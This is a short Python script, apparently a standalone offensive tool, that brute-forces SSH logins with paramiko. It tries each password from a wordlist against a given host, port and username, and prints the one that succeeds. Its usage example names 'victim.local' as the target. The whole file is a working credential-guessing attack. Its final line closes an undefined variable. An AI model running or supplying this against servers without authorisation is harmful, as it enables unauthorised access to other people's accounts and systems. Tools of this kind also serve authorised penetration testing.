#!/usr/bin/python3

import paramiko
import sys
import os

print("---> Python SSH Bruteforce <---")
print("")
print("USE - ./ssh_bruteforce.py [HOSTNAME/IP] [PORT] [USERNAME] [WORDLIST-PATH]")
print("EX - ./ssh_bruteforce.py victim.local 2222 user /usr/share/wordlist.txt")
print("")

target = sys.argv[1]
port = sys.argv[2]
username = sys.argv[3]
password_file = sys.argv[4]

print("")
print("[+] Starting Process...")
print("")

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r', encoding='latin-1') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('Password found: '+ password)
                 exit(0)
            elif response == 1:
                pass
        except Exception as e:
            print(e)
        pass

input_file.close()
